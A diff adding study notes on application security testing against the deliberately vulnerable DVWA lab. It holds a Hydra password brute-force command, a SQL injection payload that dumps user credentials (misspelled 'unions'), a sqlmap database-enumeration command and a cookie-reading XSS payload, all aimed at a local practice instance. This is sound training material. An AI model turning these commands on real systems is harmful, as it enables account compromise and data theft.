@@ -66,3 +66,79 @@ Application Security in the Cloud
 
 Application Security Testing
 ----------------------------
+
+
+OWASP web security testing guide
+
+Damn vulnerable web application
+Github
+Docker
+
+.. code: bash
+
+   docker run --rm -it -p 80:80 vulnerables/web-dvwa
+
+admin, password
+
+Brute Force
+~~~~~~~~~~~
+
+These tools come pre-installed on Kali Linux
+
+.. code: bash
+
+   gunzip /usr/share/wordlists/rockyou.txt.gz
+
+Hydra
+Browser network tab
+parameters and cookies
+
+.. code: bash
+
+   hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie: PHPSESSID=sessionidhash; security=low"
+
+SQL Injection
+~~~~~~~~~~~~~
+
+.. code: sql
+
+   %' and 1=0 unions select null, concat(user,':',password) from users #
+
+Unserialize password with md5 hash
+
+Sqlmap
+
+.. code: bash
+
+   sqlmap -u "http://127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=sessionidhash" -dbs --batch
+
+XSS
+~~~
+
+Stored
+
+test
+
+.. code: js
+
+   <script>alert(document.cookie)</script>
+
+Key Takeaways
+-------------
+
+NICE framework
+SAMM
+ASVS
+Threat Modeling
+Proactive Controls
+
+Understand the top risks
+
+Application Security Testing
+----------------------------
+
+Static Analysis
+Dynamic Analysis
+Manual Review
+Pentesting
+Documentation and Reports
